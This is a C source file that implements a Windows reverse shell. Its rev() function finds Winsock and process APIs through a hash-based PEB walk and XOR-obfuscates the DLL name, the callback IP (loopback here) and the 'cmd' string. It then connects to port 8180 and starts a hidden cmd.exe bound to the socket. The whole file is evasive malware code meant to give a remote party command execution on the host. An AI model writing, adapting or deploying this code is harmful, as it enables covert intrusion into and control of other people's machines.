#include "structs.h"
#include <stdio.h>
#include <inttypes.h>

/*---------------------------------------------------------------------------------------------------------------------------------------------------------------*/

#define KEY1 0x7c
#define KEY2 0x69
#define KEY3 0x73

#define SEED                181
#define LOADLIBRARYA_H      2179633274
#define CREATEPROCESSA_H    3279178822
#define WSASTARTUP_H        3399804530
#define WSASOCKETA_H        4086672762
#define INET_ADDR_H         1423830552
#define CONNECT_H           4003214732

#define LOSELOSE_HASH(s, hash) do {                   \
    (hash) = 0;                                       \
    const char *_p = (s);                             \
    int _c;                                           \
    while ((_c = (unsigned char)(*_p++))) {           \
        (hash) += _c;                                 \
        (hash) *= (_c + SEED);                        \
    }                                                 \
} while (0)

#define MEMSET(buf, val, len)   for (int i = 0; i < (len); i++) ((char*)(buf))[i] = (val)
#define LEN(s)                  ({ const char *_p = (s); while (*_p) _p++; _p - (s); })
#define HTONS(x)                ( ( (( (USHORT)(x) ) >> 8 ) & 0xff) | ((( (USHORT)(x) ) & 0xff) << 8) )

/*---------------------------------------------------------------------------------------------------------------------------------------------------------------*/

typedef HMODULE (WINAPI* LOADLIBRARYA)(LPCSTR);
typedef BOOL (WINAPI* CREATEPROCESSA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID , LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef int (WINAPI* WSASTARTUP)(WORD, LPWSADATA);
typedef SOCKET (WINAPI* WSASOCKETA)(int, int, int, WSAPROTOCOL_INFOA*, DWORD, DWORD);
typedef unsigned long (WINAPI* INET_ADDR)(const char*);
typedef int (WINAPI* CONNECT)(SOCKET, struct sockaddr*, int);

/*---------------------------------------------------------------------------------------------------------------------------------------------------------------*/

static inline unsigned char _xor(unsigned char x, unsigned char y) {
    return (x | y) & ~(x & y);  // equivalent to x ^ y
}

static void xor_buf(char* buf, unsigned char key) {
    for (size_t i = 0; i < LEN(buf); i++) {
        buf[i] = _xor(buf[i], key);
    }
}

// Get Function Address via PEB Walk
static HMODULE GetProcAddressPEB(DWORD64 qwFuncHash) {    
	PIMAGE_EXPORT_DIRECTORY pImgExportDir;
	DWORD dwFunctionNumber, dwHash;    
	PDWORD pdwFuncNameBase;
	PCSTR pszFunctionName;
	WORD wOrdinalIndex;

	PPEB pPEB = (PPEB) __readgsqword( 0x60 ); // Access the PEB structure directly via GS:[0x60] on x64.
	PPEB_LDR_DATA Ldr = (PPEB_LDR_DATA) pPEB->Ldr; // The PEB contains a pointer to PEB_LDR_DATA, which has a linked list of loaded modules.    
	PLIST_ENTRY pNextModule = Ldr->InLoadOrderModuleList.Flink; // This is the first module (usually the main EXE), and from here we walk the list.    
	PLDR_DATA_TABLE_ENTRY DataTableEntry = (PLDR_DATA_TABLE_ENTRY) pNextModule;	 
	while (DataTableEntry->DllBase != NULL) {    
    	DWORD64 qwModuleBase = (DWORD64)DataTableEntry->DllBase;	// Loop over all modules. DllBase is the base address of the module in memory.    
    	PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS) ( qwModuleBase + ((PIMAGE_DOS_HEADER) qwModuleBase)->e_lfanew); // Locate NT headers using the PE structure (DOS header --> NT header).    
    	DWORD dwExportDirRVA = pImgNtHdrs->OptionalHeader.DataDirectory[0].VirtualAddress; // This retrieves the Export Directory from the module.
    	DataTableEntry = (PLDR_DATA_TABLE_ENTRY) DataTableEntry->InLoadOrderLinks.Flink; // Get the next loaded module entry (ntdll.dll --> kernel32.dll)
    	if (dwExportDirRVA == 0) {
        	continue;
    	}    
    	pImgExportDir = (PIMAGE_EXPORT_DIRECTORY) ((DWORD64) qwModuleBase + dwExportDirRVA); // Get a pointer to the actual export directory table.
    	dwFunctionNumber = pImgExportDir->NumberOfNames;
    	pdwFuncNameBase = (PDWORD) ((PCHAR) qwModuleBase + pImgExportDir->AddressOfNames);  // Extract names of all exported functions from the module.
    	for (DWORD i = 0; i < dwFunctionNumber; i++) {
        	pszFunctionName = (PCSTR) (*pdwFuncNameBase + (DWORD64) qwModuleBase);
        	pdwFuncNameBase++;    
        	LOSELOSE_HASH(pszFunctionName, dwHash);    
        	if (dwHash == qwFuncHash) {	// For each function, hash its name and compare it to the input hash.                       	 
            	wOrdinalIndex = *(PWORD)(((DWORD64) qwModuleBase + pImgExportDir->AddressOfNameOrdinals) + (2 * i));
            	return (HMODULE) ((DWORD64) qwModuleBase + *(PDWORD)(((DWORD64) qwModuleBase + pImgExportDir->AddressOfFunctions) + (4 * wOrdinalIndex))); // If matched, resolve function address using its ordinal --> RVA --> VA.                               	 
        	}
    	}
	}
	return NULL;
}

void rev() {
    
	int port = 8180 ;
	char ip[] = {0x42,0x41,0x44,0x5d,0x43,0x5d,0x43,0x5d,0x42, 0x73};
	
	//   ws2_32.dll    0x77  0x73  0x32  0x5f  0x33  0x32  0x2e  0x64  0x6c  0x6c  key
	char ws2_32_dll[] = {0x0b, 0x0f, 0x4e, 0x23, 0x4f, 0x4e, 0x52, 0x18, 0x10, 0x10, 0x7c};

	// powershell 0x70, 0x6f, 0x77, 0x65, 0x72, 0x73, 0x68, 0x65, 0x6c, 0x6c,  key
	//	 cmd	  0x63, 0xcd, 0x64, key
	char cmd[] = {0x0a, 0x04, 0x0d, 0x69};
	
	// get function addresses
	UINT64 pLoadLibraryA = (UINT64)GetProcAddressPEB(LOADLIBRARYA_H);	 
	UINT64 pCreateProcessA = (UINT64)GetProcAddressPEB(CREATEPROCESSA_H);   
	xor_buf(ws2_32_dll, KEY1);
	((LOADLIBRARYA)pLoadLibraryA)(ws2_32_dll);
	UINT64 pWSAStartup = (UINT64)GetProcAddressPEB(WSASTARTUP_H);
	UINT64 pWSASocketA = (UINT64)GetProcAddressPEB(WSASOCKETA_H);
	UINT64 pinet_addr = (UINT64)GetProcAddressPEB(INET_ADDR_H);
	UINT64 pconnect = (UINT64)GetProcAddressPEB(CONNECT_H);

	// winsock struct declarations
	WSADATA wsadata; 
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	SOCKADDR_IN sa;
	
	((WSASTARTUP)pWSAStartup)(MAKEWORD(2, 2), &wsadata); // required before using winsock
	SOCKET socket = ((WSASOCKETA)pWSASocketA)(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0); // create the socket
	sa.sin_family = AF_INET;
	sa.sin_port = HTONS(port);
	xor_buf(ip, KEY3);
	sa.sin_addr.s_addr = ((INET_ADDR)pinet_addr)(ip); // set sa fields
	((CONNECT)pconnect)(socket, &sa, sizeof(sa)); // perform the connection
	size_t siLen = sizeof(si);
	MEMSET(&si, 0 ,siLen); // fill in si (prep for CreateProcessA)
	si.cb = siLen;
	si.dwFlags = (STARTF_USESTDHANDLES);
	si.hStdInput = (HANDLE)socket;
	si.hStdOutput = (HANDLE)socket;
	si.hStdError = (HANDLE)socket;
	xor_buf(cmd, KEY2);
	((CREATEPROCESSA)pCreateProcessA)(NULL, (LPSTR)cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, (LPSTARTUPINFOA)&si, &pi); // launch shell bound for socket
    
}
